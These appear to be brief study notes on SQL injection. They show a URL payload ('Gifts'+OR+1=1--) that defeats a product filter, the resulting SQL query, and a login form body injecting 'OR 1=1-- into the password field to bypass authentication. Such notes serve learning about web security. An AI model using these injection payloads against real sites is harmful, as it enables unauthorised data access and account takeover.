SQLi
is that easy

https://insecure-website.com/products?category=Gifts'+OR+1=1--

This results in the SQL query:
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

csrf=7SPxzGnSXOciUDIY4cCaQ52E7ilIWdcy&username=administrator&password=test'OR+1=1--
